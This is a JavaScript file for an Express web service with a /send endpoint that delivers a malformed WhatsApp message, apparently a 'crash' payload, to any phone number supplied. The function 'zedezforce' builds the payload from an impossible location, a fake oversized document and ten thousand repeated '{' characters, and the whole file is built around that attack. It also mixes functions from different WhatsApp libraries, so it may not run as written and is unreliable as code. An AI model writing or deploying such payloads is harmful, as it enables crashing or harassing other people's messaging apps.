import express from 'express';
import { create, proto, generateWAMessageFromContent } from '@open-wa/wa-automate';

const app = express();
app.use(express.json());

let client;

async function zedezforce(client, target, messageText) {
  const payload = generateWAMessageFromContent(target, proto.Message.fromObject({
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Pesan dari Bot",
            locationMessage: {
              degreesLatitude: -999,
              degreesLongitude: 922,
              name: "Bot Location",
              address: "Bot Address",
              jpegThumbnail: null
            },
            hasMediaAttachment: false
          },
          body: {
            text: messageText
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: []
          },
          documentMessage: {
            url: "https://example.com/file.enc",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "hashstring",
            fileLength: "999999999",
            pageCount: 1,
            mediaKey: "mediaKey",
            fileName: "fileName",
            fileEncSha256: "fileEncSha256",
            directPath: "/directpath",
            mediaKeyTimestamp: "1726867151",
            jpegThumbnail: null
          },
          hasMediaAttachment: true
        }
      }
    }
  }), { userJid: target });

  await client.relayMessage(target, payload.message, {
    messageId: payload.key.id
  });
}

create().then(async c => {
  client = c;
  console.log('WA client ready');

  app.post('/send', async (req, res) => {
    const { number, message } = req.body;
    if (!number || !message) return res.status(400).json({ error: 'Nomor dan pesan harus diisi' });

    const target = number + '@c.us';
    try {
      await zedezforce(client, target, message);
      res.json({ success: true, message: 'Pesan berhasil dikirim' });
    } catch (e) {
      console.error(e);
      res.status(500).json({ success: false, error: e.message });
    }
  });

  app.listen(3000, () => console.log('Server listening on http://localhost:3000'));
}).catch(console.error);
